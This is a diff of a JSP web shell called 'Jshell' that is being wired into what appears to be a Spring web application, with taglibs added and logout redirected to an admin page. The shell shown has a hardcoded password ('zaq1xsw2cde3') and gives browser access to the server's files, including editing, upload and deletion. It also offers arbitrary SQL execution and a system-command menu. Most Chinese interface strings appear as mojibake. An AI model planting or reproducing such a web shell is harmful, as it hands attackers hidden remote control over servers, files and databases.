@@ -1,13 +1,29 @@
-<%@ page contentType="text/html; charset=GBK" %>
+<%@ taglib prefix="sf" uri="http://www.springframework.org/tags/form"%>
+<%@ taglib prefix="spring" uri="http://www.springframework.org/tags"%>
+<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
+<%@ taglib prefix="tiles" uri="http://tiles.apache.org/tags-tiles"%>
+<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<spring:url value="/" var="home"></spring:url>
+
+<jsp:include page="/common/common.jsp"></jsp:include>
+
 <%@ page import="java.io.*"%>
 <%@ page import="java.util.Map"%>
 <%@ page import="java.util.HashMap"%>
 <%@ page import="java.nio.charset.Charset"%>
 <%@ page import="java.util.regex.*"%>
 <%@ page import="java.sql.*"%>
+
+<%
+   String contextPath = request.getScheme()+"://"+request.getServerName()    +":"+request.getServerPort()+request.getContextPath()+"/";
+   System.out.println(contextPath);
+%>
 <%!
+
+
+
 private String _password = "zaq1xsw2cde3";
-private String _encodeType = "UTF-8";
+private String _encodeType = "GBK";
 private int _sessionOutTime = 20;
 private String[] _textFileTypes = {"txt", "htm", "html", "asp", "jsp", "js", "css", "c", "cpp", "sh", "pl", "cgi", "php", "conf", "xml", "xsl", "ini", "vbs", "inc", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java"};
 private Connection _dbConnection = null;
@@ -135,14 +151,14 @@ public String listFiles(String path, String curUri) {
 			sRet += "var selectedFile = null;\n";
 			sRet += "<!--\n";
 			sRet += "function createFolder() {\n";
-			sRet += "	var folderName = prompt(\"ÇëÊäÈëÄ¿Â¼Ãû\", \"\");\n";
+			sRet += "	var folderName = prompt(\"è¯·è¾“å…¥ç›®å½•å\", \"\");\n";
 			sRet += "	if (folderName != null && folderName != false && ltrim(folderName) != \"\") {\n";
 			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFolder&folderName=\" + folderName + \"" + "\";\n";
 			sRet += "	}\n";
 			sRet += "}\n";
 			sRet += "\n";
 			sRet += "function createFile() {\n";
-			sRet += "	var fileName = prompt(\"ÇëÊäÈëÎÄ¼şÃû\", \"\");\n";
+			sRet += "	var fileName = prompt(\"è¯·è¾“å…¥æ–‡ä»¶å\", \"\");\n";
 			sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
 			sRet += "		window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFile&fileName=\" + fileName + \"" + "\";\n";
 			sRet += "	}\n";
@@ -170,7 +186,7 @@ public String listFiles(String path, String curUri) {
 			sRet += "}\n";
 			sRet += "\n";
 			sRet += "function copyFile() {\n";
-			sRet += "	var toPath = prompt(\"ÇëÊäÈëÒª¸´ÖÆµ½µÄÄ¿Â¼(¾ø¶ÔÂ·¾¶)\", \"\");\n";
+			sRet += "	var toPath = prompt(\"è¯·è¾“å…¥è¦å¤åˆ¶åˆ°çš„ç›®å½•(ç»å¯¹è·¯å¾„)\", \"\");\n";
 			sRet += "	if (toPath != null && toPath != false && ltrim(toPath) != \"\") {\n";
 			sRet += "		document.fileList.action = \"" + curUri + "&curPath=" + path + "&fsAction=copyto&dstPath=" + "\" + toPath;\n";
 			sRet += "		document.fileList.submit();\n";
@@ -187,11 +203,11 @@ public String listFiles(String path, String curUri) {
 			sRet += "		}\n";
 			sRet += "	}\n";
 			sRet += "	if (count > 1)\n";
-			sRet += "		alert(\"²»ÄÜÖØÃüÃû¶à¸öÎÄ¼ş\");\n";
+			sRet += "		alert(\"ä¸èƒ½é‡å‘½åå¤šä¸ªæ–‡ä»¶\");\n";
 			sRet += "	else if (selected == -1)\n";
-			sRet += "		alert(\"Ã»ÓĞÑ¡ÖĞÒªÖØÃüÃûµÄÎÄ¼ş\");\n";
+			sRet += "		alert(\"æ²¡æœ‰é€‰ä¸­è¦é‡å‘½åçš„æ–‡ä»¶\");\n";
 			sRet += "	else {\n";
-			sRet += "		var newName = prompt(\"ÇëÊäÈëĞÂÎÄ¼şÃû\", \"\");\n";
+			sRet += "		var newName = prompt(\"è¯·è¾“å…¥æ–°æ–‡ä»¶å\", \"\");\n";
 			sRet += "		if (newName != null && newName != false && ltrim(newName) != \"\") {\n";
 			sRet += "			window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=rename&newName=\" + newName + \"&fileRename=\" + document.fileList.filesDelete[selected].value;";
 			sRet += "		}\n";
@@ -206,14 +222,14 @@ public String listFiles(String path, String curUri) {
 			if (curFile != null) {
 				sRet += "	<tr>\n";
 				sRet += "		<td colspan=\"4\" valign=\"middle\">\n";
-				sRet += "			&nbsp;<a href=\"" + curUri + "&curPath=" + (curFile.getParent() == null ? "" : pathConvert(curFile.getParent())) + "\">ÉÏ¼¶Ä¿Â¼</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:createFolder()\">´´½¨Ä¿Â¼</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:createFile()\">ĞÂ½¨ÎÄ¼ş</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:document.fileList.submit();\">É¾³ı</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:copyFile()\">¸´ÖÆ</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:rename()\">ÖØÃüÃû</a>&nbsp;";
-				sRet += "<a href=\"#\" onclick=\"javascript:showUpload()\">ÉÏ´«ÎÄ¼ş</a>\n";
-				sRet += "<span style=\"visibility: hidden\" id=\"up\"><input type=\"file\" value=\"ÉÏ´«\" name=\"upFile\" size=\"8\" class=\"textbox\" />&nbsp;<input type=\"submit\" value=\"ÉÏ´«\" class=\"button\"></span>\n";
+				sRet += "			&nbsp;<a href=\"" + curUri + "&curPath=" + (curFile.getParent() == null ? "" : pathConvert(curFile.getParent())) + "\">ä¸Šçº§ç›®å½•</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:createFolder()\">åˆ›å»ºç›®å½•</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:createFile()\">æ–°å»ºæ–‡ä»¶</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:document.fileList.submit();\">åˆ é™¤</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:copyFile()\">å¤åˆ¶</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:rename()\">é‡å‘½å</a>&nbsp;";
+				sRet += "<a href=\"#\" onclick=\"javascript:showUpload()\">ä¸Šä¼ æ–‡ä»¶</a>\n";
+				sRet += "<span style=\"visibility: hidden\" id=\"up\"><input type=\"file\" value=\"ä¸Šä¼ \" name=\"upFile\" size=\"8\" class=\"textbox\" />&nbsp;<input type=\"submit\" value=\"ä¸Šä¼ \" class=\"button\"></span>\n";
 				sRet += "		</td>\n";
 				sRet += "	</tr>\n";
 			}
@@ -314,7 +330,7 @@ public String browseFile(String path) {
 
 	} catch (IOException e) {
 		sRet += "<script language=\"javascript\">\n";
-		sRet += "alert(\"´ò¿ªÎÄ¼ş" + path + "Ê§°Ü\");\n";
+		sRet += "alert(\"æ‰“å¼€æ–‡ä»¶" + path + "å¤±è´¥\");\n";
 		sRet += "</script>\n";
 	}
 
@@ -353,10 +369,10 @@ public String openFile(String path, String curUri) {
 			fileReader.close();
 		} catch (IOException e) {
 			fileString = null;
-			sRet = "<font color=\"red\">²»ÄÜ´ò¿ªÎÄ¼ş\"" + path + "\"</font>";
+			sRet = "<font color=\"red\">ä¸èƒ½æ‰“å¼€æ–‡ä»¶\"" + path + "\"</font>";
 		} catch (SecurityException e) {
 			fileString = null;
-			sRet = "<font color=\"red\">°²È«ÎÊÌâ£¬Ã»ÓĞÈ¨ÏŞÖ´ĞĞ¸Ã²Ù×÷</font>";
+			sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œè¯¥æ“ä½œ</font>";
 		}
 	} else {
 		sRet = "<font color=\"red\">file \"" + path + "\" is not a text file, can't be opened in text mode</font>";
@@ -366,7 +382,7 @@ public String openFile(String path, String curUri) {
 		sRet += "<script language=\"javascript\">";
 		sRet += "<!--\n";
 		sRet += "function saveAs() {\n";
-		sRet += "	var fileName = prompt(\"ÇëÊäÈëÎÄ¼şÃû\", \"\");\n";
+		sRet += "	var fileName = prompt(\"è¯·è¾“å…¥æ–‡ä»¶å\", \"\");\n";
 		sRet += "	if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
 		sRet += "		document.openfile.action=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\" + fileName + \"&fsAction=saveAs\";\n";
 		sRet += "		document.openfile.submit();\n";
@@ -377,7 +393,7 @@ public String openFile(String path, String curUri) {
 		sRet += "<table align=\"center\" width=\"100%\" cellpadding=\"2\" cellspacing=\"1\">\n";
 		sRet += "	<form name=\"openfile\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=save" + "\">\n";
 		sRet += "	<tr>\n";
-		sRet += "		<td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">ÉÏ¼¶Ä¿Â¼</a>]</td>\n";
+		sRet += "		<td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">ä¸Šçº§ç›®å½•</a>]</td>\n";
 		sRet += "	</tr>\n";
 		sRet += "	<tr>\n";
 		sRet += "		<td align=\"center\">\n";
@@ -387,7 +403,7 @@ public String openFile(String path, String curUri) {
 		sRet += "		</td>\n";
 		sRet += "	</tr>\n";
 		sRet += "	<tr>\n";
-		sRet += "		<td align=\"center\"><input type=\"submit\" class=\"button\" value=\"±£´æ\" />&nbsp;<input type=\"button\" class=\"button\" value=\"Áí´æÎª\" onclick=\"javascript:saveAs()\" /></td>\n";
+		sRet += "		<td align=\"center\"><input type=\"submit\" class=\"button\" value=\"ä¿å­˜\" />&nbsp;<input type=\"button\" class=\"button\" value=\"å¦å­˜ä¸º\" onclick=\"javascript:saveAs()\" /></td>\n";
 		sRet += "	</tr>\n";
 		sRet += "	</form>\n";
 		sRet += "</table>\n";
@@ -406,19 +422,19 @@ public String saveFile(String path, String curUri, String fileContent) {
 		file = new File(path);
 
 		if (! file.canWrite()) {
-			sRet = "<font color=\"red\">ÎÄ¼ş²»¿ÉĞ´</font>";
+			sRet = "<font color=\"red\">æ–‡ä»¶ä¸å¯å†™</font>";
 		} else {
 			FileWriter fileWriter = new FileWriter(file);
 			fileWriter.write(fileContent);
 
 			fileWriter.close();
-			sRet = "ÎÄ¼ş±£´æ³É¹¦£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­\n";
+			sRet = "æ–‡ä»¶ä¿å­˜æˆåŠŸï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦\n";
 			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />\n";
 		}
 	} catch (IOException e) {
-		sRet = "<font color=\"red\">±£´æÎÄ¼şÊ§°Ü</font>";
+		sRet = "<font color=\"red\">ä¿å­˜æ–‡ä»¶å¤±è´¥</font>";
 	} catch (SecurityException e) {
-		sRet = "<font color=\"red\">°²È«ÎÊÌâ£¬Ã»ÓĞÈ¨ÏŞÖ´ĞĞ¸Ã²Ù×÷</font>";
+		sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œè¯¥æ“ä½œ</font>";
 	}
 
 	return sRet;
@@ -434,17 +450,17 @@ public String createFolder(String path, String curUri, String folderName) {
 		folder = new File(path + folderName);
 
 		if (folder.exists() && folder.isDirectory()) {
-			sRet = "<font color=\"red\">\"" + path + folderName + "\"Ä¿Â¼ÒÑ¾­´æÔÚ</font>";
+			sRet = "<font color=\"red\">\"" + path + folderName + "\"ç›®å½•å·²ç»å­˜åœ¨</font>";
 		} else {
 			if (folder.mkdir()) {
-				sRet = "³É¹¦´´½¨Ä¿Â¼\"" + pathConvert(folder.getPath()) + "\"£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­\n";
+				sRet = "æˆåŠŸåˆ›å»ºç›®å½•\"" + pathConvert(folder.getPath()) + "\"ï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦\n";
 					sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + folderName + "\" />";
 			} else {
-				sRet = "<font color=\"red\">´´½¨Ä¿Â¼\"" + folderName + "\"Ê§°Ü</font>";
+				sRet = "<font color=\"red\">åˆ›å»ºç›®å½•\"" + folderName + "\"å¤±è´¥</font>";
 			}
 		}
 	} catch (SecurityException e) {
-		sRet = "<font color=\"red\">°²È«ÎÊÌâ£¬Ã»ÓĞÈ¨ÏŞÖ´ĞĞ¸Ã²Ù×÷</font>";
+		sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œè¯¥æ“ä½œ</font>";
 	}
 
 	return sRet;
@@ -462,12 +478,12 @@ public String createFile(String path, String curUri, String fileName) {
 		if (file.createNewFile()) {
 			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + fileName + "&fsAction=open" + "\" />";
 		} else {
-			sRet = "<font color=\"red\">\"" + path + fileName + "\"ÎÄ¼şÒÑ¾­´æÔÚ</font>";
+			sRet = "<font color=\"red\">\"" + path + fileName + "\"æ–‡ä»¶å·²ç»å­˜åœ¨</font>";
 		}
 	} catch (SecurityException e) {
-		sRet = "<font color=\"red\">°²È«ÎÊÌâ£¬Ã»ÓĞÈ¨ÏŞÖ´ĞĞ¸Ã²Ù×÷</font>";
+		sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œè¯¥æ“ä½œ</font>";
 	} catch (IOException e) {
-		sRet = "<font color=\"red\">´´½¨ÎÄ¼ş\"" + path + fileName + "\"Ê§°Ü</font>";
+		sRet = "<font color=\"red\">åˆ›å»ºæ–‡ä»¶\"" + path + fileName + "\"å¤±è´¥</font>";
 	}
 
 	return sRet;
@@ -481,16 +497,16 @@ public String deleteFile(String path, String curUri, String[] files2Delete) {
 		for (int i = 0; i < files2Delete.length; i ++) {
 			tmpFile = new File(files2Delete[i]);
 			if (! tmpFile.delete()) {
-				sRet += "<font color=\"red\">É¾³ı\"" + files2Delete[i] + "\"Ê§°Ü</font><br>\n";
+				sRet += "<font color=\"red\">åˆ é™¤\"" + files2Delete[i] + "\"å¤±è´¥</font><br>\n";
 			}
 		}
 
 		if (sRet.equals("")) {
-			sRet = "É¾³ı³É¹¦£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­\n";
+			sRet = "åˆ é™¤æˆåŠŸï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦\n";
 			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
 		}
 	} catch (SecurityException e) {
-		sRet = "<font color=\"red\">°²È«ÎÊÌâ£¬Ã»ÓĞÈ¨ÏŞÖ´ĞĞ¸Ã²Ù×÷</font>\n";
+		sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜ï¼Œæ²¡æœ‰æƒé™æ‰§è¡Œè¯¥æ“ä½œ</font>\n";
 	}
 
 	return sRet;
@@ -511,10 +527,10 @@ public String saveAs(String path, String curUri, String fileContent) {
 
 			sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />";
 		} else {
-			sRet = "<font color=\"red\">ÎÄ¼ş\"" + path + "\"ÒÑ¾­´æÔÚ</font>";
+			sRet = "<font color=\"red\">æ–‡ä»¶\"" + path + "\"å·²ç»å­˜åœ¨</font>";
 		}
 	} catch (IOException e) {
-		sRet = "<font color=\"red\">´´½¨ÎÄ¼ş\"" + path + "\"Ê§°Ü</font>";
+		sRet = "<font color=\"red\">åˆ›å»ºæ–‡ä»¶\"" + path + "\"å¤±è´¥</font>";
 	}
 
 	return sRet;
@@ -540,7 +556,7 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		String filePath = null;
 
 		//
-		// °ÑÊäÈëÁ÷¶ÁÈëÒ»¸ö×Ö½ÚÊı×é
+		// æŠŠè¾“å…¥æµè¯»å…¥ä¸€ä¸ªå­—èŠ‚æ•°ç»„
 		//
 		while ((nBytes = in.read(inBytes, start, size)) != -1) {
 			start += nBytes;
@@ -548,7 +564,7 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 
 		in.close();
 		//
-		// ´Ó×Ö½ÚÊı×éÖĞµÃµ½ÎÄ¼ş·Ö¸ô·ûºÅ
+		// ä»å­—èŠ‚æ•°ç»„ä¸­å¾—åˆ°æ–‡ä»¶åˆ†éš”ç¬¦å·
 		//
 		int i = 0;
 		byte[] seperator;
@@ -564,7 +580,7 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		}
 
 		//
-		// µÃµ½Header²¿·Ö
+		// å¾—åˆ°Headeréƒ¨åˆ†
 		//
 		String dataHeader = null;
 		i += 3;
@@ -576,7 +592,7 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		dataHeader = new String(inBytes, start, end - start + 1);
 
 		//
-		// µÃµ½ÎÄ¼şÃû
+		// å¾—åˆ°æ–‡ä»¶å
 		//
 		token = "filename=\"";
 		start = dataHeader.indexOf(token) + token.length();
@@ -587,7 +603,7 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		String fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
 
 		//
-		// µÃµ½ÎÄ¼şÄÚÈİ¿ªÊ¼Î»ÖÃ
+		// å¾—åˆ°æ–‡ä»¶å†…å®¹å¼€å§‹ä½ç½®
 		//
 		i += 4;
 		start = i;
@@ -612,12 +628,12 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		}*/
 
 		//
-		// ÍµÀÁµÄ°ì·¨
+		// å·æ‡’çš„åŠæ³•
 		//
 		end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
 
 		//
-		// ±£´æÎªÎÄ¼ş
+		// ä¿å­˜ä¸ºæ–‡ä»¶
 		//
 		File newFile = new File(path + fileName);
 		newFile.createNewFile();
@@ -628,11 +644,11 @@ public String uploadFile(ServletRequest request, String path, String curUri) {
 		out.close();
 
 		sRet = "<script language=\"javascript\">\n";
-		sRet += "alert(\"ÎÄ¼şÉÏ´«³É¹¦" + fileName + "\");\n";
+		sRet += "alert(\"æ–‡ä»¶ä¸Šä¼ æˆåŠŸ" + fileName + "\");\n";
 		sRet += "</script>\n";
 	} catch (IOException e) {
 		sRet = "<script language=\"javascript\">\n";
-		sRet += "alert(\"ÎÄ¼şÉÏ´«Ê§°Ü\");\n";
+		sRet += "alert(\"æ–‡ä»¶ä¸Šä¼ å¤±è´¥\");\n";
 		sRet += "</script>\n";
 	}
 
@@ -686,12 +702,12 @@ public String copyFiles(String path, String curUri, String[] files2Copy, String 
 
 	for (i = 0; i < files2Copy.length; i ++) {
 		if (! fileCopy(files2Copy[i], dstPath + getFileNameByPath(files2Copy[i]))) {
-			sRet += "<font color=\"red\">ÎÄ¼ş\"" + files2Copy[i] + "\"¸´ÖÆÊ§°Ü</font><br/>";
+			sRet += "<font color=\"red\">æ–‡ä»¶\"" + files2Copy[i] + "\"å¤åˆ¶å¤±è´¥</font><br/>";
 		}
 	}
 
 	if (sRet.equals("")) {
-		sRet = "ÎÄ¼ş¸´ÖÆ³É¹¦£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­";
+		sRet = "æ–‡ä»¶å¤åˆ¶æˆåŠŸï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦";
 		sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
 	}
 
@@ -722,14 +738,14 @@ public String renameFile(String path, String curUri, String file2Rename, String 
 		File newFile = new File(newName);
 
 		if (! file.exists()) {
-			sRet = "<font color=\"red\">ÎÄ¼ş\"" + file2Rename + "\"²»´æÔÚ</font>";
+			sRet = "<font color=\"red\">æ–‡ä»¶\"" + file2Rename + "\"ä¸å­˜åœ¨</font>";
 		} else {
 			file.renameTo(newFile);
-			sRet = "ÎÄ¼şÖØÃüÃû³É¹¦£¬ÕıÔÚ·µ»Ø£¬ÇëÉÔºò¡­¡­";
+			sRet = "æ–‡ä»¶é‡å‘½åæˆåŠŸï¼Œæ­£åœ¨è¿”å›ï¼Œè¯·ç¨å€™â€¦â€¦";
 			sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
 		}
 	} catch (SecurityException e) {
-		sRet = "<font color=\"red\">°²È«ÎÊÌâµ¼ÖÂÎÄ¼ş\"" + file2Rename + "\"¸´ÖÆÊ§°Ü</font>";
+		sRet = "<font color=\"red\">å®‰å…¨é—®é¢˜å¯¼è‡´æ–‡ä»¶\"" + file2Rename + "\"å¤åˆ¶å¤±è´¥</font>";
 	}
 
 	return sRet;
@@ -794,7 +810,7 @@ public String DBExecute(String sql) {
 	String sRet = "";
 
 	if (_dbConnection == null || _dbStatement == null) {
-		sRet = "<font color=\"red\">Êı¾İ¿âÃ»ÓĞÕı³£Á¬½Ó</font>";
+		sRet = "<font color=\"red\">æ•°æ®åº“æ²¡æœ‰æ­£å¸¸è¿æ¥</font>";
 	} else {
 		try {
 			if (sql.toLowerCase().substring(0, 6).equals("select")) {
@@ -803,7 +819,7 @@ public String DBExecute(String sql) {
 				int colNum = rsmd.getColumnCount();
 				int colType;
 
-				sRet = "sqlÓï¾äÖ´ĞĞ³É¹¦£¬·µ»Ø½á¹û<br>\n";
+				sRet = "sqlè¯­å¥æ‰§è¡ŒæˆåŠŸï¼Œè¿”å›ç»“æœ<br>\n";
 				sRet += "<table align=\"center\" border=\"0\" bgcolor=\"#CCCCCC\" cellpadding=\"2\" cellspacing=\"1\">\n";
 				sRet +=	"    <tr bgcolor=\"#FFFFFF\">\n";
 				for (int i = 1; i <= colNum; i ++) {
@@ -886,13 +902,13 @@ public String DBExecute(String sql) {
 				rs.close();
 			} else {
 				if (_dbStatement.execute(sql)) {
-					sRet = "sqlÓï¾äÖ´ĞĞ³É¹¦";
+					sRet = "sqlè¯­å¥æ‰§è¡ŒæˆåŠŸ";
 				} else {
-					sRet = "<font color=\"red\">sqlÓï¾äÖ´ĞĞÊ§°Ü</font>";
+					sRet = "<font color=\"red\">sqlè¯­å¥æ‰§è¡Œå¤±è´¥</font>";
 				}
 			}
 		} catch (SQLException e) {
-			sRet = "<font color=\"red\">sqlÓï¾äÖ´ĞĞÊ§°Ü</font>";
+			sRet = "<font color=\"red\">sqlè¯­å¥æ‰§è¡Œå¤±è´¥</font>";
 		}
 	}
 
@@ -939,7 +955,7 @@ class JshellConfig {
 
 			jshell.close();
 		} catch (IOException e) {
-			throw new JshellConfigException("´ò¿ªÎÄ¼şÊ§°Ü");
+			throw new JshellConfigException("æ‰“å¼€æ–‡ä»¶å¤±è´¥");
 		}
 	}
 
@@ -958,7 +974,7 @@ class JshellConfig {
 
 			jshell.write(buffer, start, buffer.length - 1 - start);
 		} catch (IOException e) {
-			new JshellConfigException("Ğ´ÎÄ¼şÊ§°Ü");
+			new JshellConfigException("å†™æ–‡ä»¶å¤±è´¥");
 		} finally {
 			try {
 				jshell.close();
@@ -973,13 +989,13 @@ class JshellConfig {
 		Matcher m = p.matcher(password);
 
 		if (! m.matches()) {
-			throw new JshellConfigException("ÃÜÂë²»ÄÜÓĞ³ı×ÖÄ¸Êı×ÖÏÂ»®ÏßÒÔÍâµÄ×Ö·û");
+			throw new JshellConfigException("å¯†ç ä¸èƒ½æœ‰é™¤å­—æ¯æ•°å­—ä¸‹åˆ’çº¿ä»¥å¤–çš„å­—ç¬¦");
 		}
 
 		p = Pattern.compile("private\\sString\\s_password\\s=\\s\"" + _password + "\"");
 		m = p.matcher(_jshellContent);
 		if (! m.find()) {
-			throw new JshellConfigException("³ÌĞòÌåÒÑ¾­±»·Ç·¨ĞŞ¸Ä");
+			throw new JshellConfigException("ç¨‹åºä½“å·²ç»è¢«éæ³•ä¿®æ”¹");
 		}
 
 		_jshellContent = m.replaceAll("private String _password = \"" + password + "\"");
@@ -992,14 +1008,14 @@ class JshellConfig {
 		Matcher m = p.matcher(encodeType);
 
 		if (! m.matches()) {
-			throw new JshellConfigException("±àÂë¸ñÊ½Ö»ÄÜÊÇ×ÖÄ¸ºÍÊı×ÖµÄ×éºÏ");
+			throw new JshellConfigException("ç¼–ç æ ¼å¼åªèƒ½æ˜¯å­—æ¯å’Œæ•°å­—çš„ç»„åˆ");
 		}
 
 		p = Pattern.compile("private\\sString\\s_encodeType\\s=\\s\"" + _encodeType + "\"");
 		m = p.matcher(_jshellContent);
 
 		if (! m.find()) {
-			throw new JshellConfigException("³ÌĞòÌåÒÑ¾­±»·Ç·¨ĞŞ¸Ä");
+			throw new JshellConfigException("ç¨‹åºä½“å·²ç»è¢«éæ³•ä¿®æ”¹");
 		}
 
 		_jshellContent = m.replaceAll("private String _encodeType = \"" + encodeType + "\"");
@@ -1011,14 +1027,14 @@ class JshellConfig {
 		Matcher m = p.matcher(sessionTime);
 
 		if (! m.matches()) {
-			throw new JshellConfigException("session³¬Ê±Ê±¼äÖ»ÄÜÌîÊı×Ö");
+			throw new JshellConfigException("sessionè¶…æ—¶æ—¶é—´åªèƒ½å¡«æ•°å­—");
 		}
 
 		p = Pattern.compile("private\\sint\\s_sessionOutTime\\s=\\s" + _sessionOutTime);
 		m = p.matcher(_jshellContent);
 
 		if (! m.find()) {
-			throw new JshellConfigException("³ÌĞòÌåÒÑ¾­±»·Ç·¨ĞŞ¸Ä");
+			throw new JshellConfigException("ç¨‹åºä½“å·²ç»è¢«éæ³•ä¿®æ”¹");
 		}
 
 		_jshellContent = m.replaceAll("private int _sessionOutTime = " + sessionTime);
@@ -1036,7 +1052,7 @@ class JshellConfig {
 			m = p.matcher(textFileTypes[i]);
 
 			if (! m.matches()) {
-				throw new JshellConfigException("À©Õ¹ÃûÖ»ÄÜÊÇ×ÖÄ¸Êı×ÖºÍÏÂ»®ÏßµÄ×éºÏ");
+				throw new JshellConfigException("æ‰©å±•ååªèƒ½æ˜¯å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿çš„ç»„åˆ");
 			}
 
 			if (i != textFileTypes.length - 1)
@@ -1056,7 +1072,7 @@ class JshellConfig {
 		m = p.matcher(_jshellContent);
 
 		if (! m.find()) {
-			throw new JshellConfigException("³ÌĞòÎÄ¼şÒÑ¾­±»·Ç·¨ĞŞ¸Ä");
+			throw new JshellConfigException("ç¨‹åºæ–‡ä»¶å·²ç»è¢«éæ³•ä¿®æ”¹");
 		}
 
 		_jshellContent = m.replaceAll(fileTypes);
@@ -1082,11 +1098,11 @@ class JshellConfigException extends Exception {
 <style>
 body {
 	font-size: 14px;
-	font-family: ËÎÌå;
+	font-family: å®‹ä½“;
 }
 td {
 	font-size: 14px;
-	font-family: ËÎÌå;
+	font-family: å®‹ä½“;
 }
 
 input.textbox {
@@ -1097,13 +1113,13 @@ input.textbox {
 
 input.button {
 	font-size: 12px;
-	font-family: ËÎÌå;
+	font-family: å®‹ä½“;
 	border: black solid 1;
 }
 
 td.datarows {
 	font-size: 14px;
-	font-family: ËÎÌå;
+	font-family: å®‹ä½“;
 	height: 25px;
 }
 
@@ -1157,7 +1173,7 @@ if (request.getParameter("password") == null && session.getAttribute("password")
 		password = (String)request.getParameter("password");
 
 		if (validate(password) == false) {
-			out.println("<div align=\"center\"><font color=\"red\"><li>ÃÜÂë´íÎó!</font></div>");
+			out.println("<div align=\"center\"><font color=\"red\"><li>å¯†ç é”™è¯¯!</font></div>");
 			out.close();
 			return;
 		}
@@ -1176,7 +1192,7 @@ if (request.getParameter("password") == null && session.getAttribute("password")
 
 	if (action.equals("exit")) {
 		session.removeAttribute("password");
-		response.sendRedirect(request.getRequestURI());
+		response.sendRedirect(contextPath + "sys/mgrindex");
 		out.close();
 		return;
 	}
@@ -1187,16 +1203,16 @@ if (request.getParameter("password") == null && session.getAttribute("password")
 <table align="center" width="600" border="0" cellpadding="2" cellspacing="0">
 	<form name="form1" method="get">
 	<tr bgcolor="#CCCCCC">
-		<td id="title"><!--[³ÌĞòÊ×Ò³]--></td>
+		<td id="title"><!--[ç¨‹åºé¦–é¡µ]--></td>
 		<td align="right">
 			<select name="action" onChange="javascript:changeAction(document.form1)">
-				<option value="main">³ÌĞòÊ×Ò³</option>
-				<option value="filesystem">ÎÄ¼şÏµÍ³</option>
-				<option value="command">ÏµÍ³ÃüÁî</option>
-				<option value="database">Êı¾İ¿â</option>
-				<option value="config">³ÌĞòÅäÖÃ</option>
-				<option value="about">¹ØÓÚ³ÌĞò</option>
-				<option value="exit">ÍË³ö³ÌĞò</option>
+				<option value="main">ç¨‹åºé¦–é¡µ</option>
+				<option value="filesystem">æ–‡ä»¶ç³»ç»Ÿ</option>
+				<option value="command">ç³»ç»Ÿå‘½ä»¤</option>
+				<option value="database">æ•°æ®åº“</option>
+				<option value="config">ç¨‹åºé…ç½®</option>
+				<option value="about">å…³äºç¨‹åº</option>
+				<option value="exit">é€€å‡ºç¨‹åº</option>
 			</select>
 <script language="JavaScript">
 <%
@@ -1224,106 +1240,106 @@ for (var i = 0; i < sAction.length; i ++) {
 %>
 <table align="center" width="600" cellpadding="2" cellspacing="1" border="0" bgcolor="#CCCCCC">
 	<tr bgcolor="#FFFFFF">
-		<td colspan="2" align="center">·şÎñÆ÷ĞÅÏ¢</td>
